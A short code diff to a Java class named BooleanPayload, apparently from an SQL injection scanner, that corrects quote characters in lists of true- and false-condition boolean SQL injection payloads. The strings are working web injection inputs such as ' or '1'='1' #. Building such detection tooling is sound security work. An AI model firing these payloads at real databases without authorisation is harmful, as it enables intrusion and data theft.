@@ -23,7 +23,7 @@ public class BooleanPayload {
             ") or (1=1) #",
             "' or '1'='1\' #",
             "') or ('1'='1\')#",
-            "\" or \"A\"=\"A\'#",
+            "\" or \"A\"=\"A\"#",
             "\")or (\"1\"=\"1\") #"
     );
     public static List booleanFalesPayload = Arrays.asList(
@@ -36,8 +36,8 @@ public class BooleanPayload {
             " or 1=12 #",
             ") or (1=12) #",
             "' or '1'='12' #",
-            "') or ('1'='12)#",
-            "\" or \"A\"=\"A2#",
+            "') or ('1'='12')#",
+            "\" or \"A\"=\"A2\"#",
             "\")or (\"1\"=\"12\") #"
     );
 
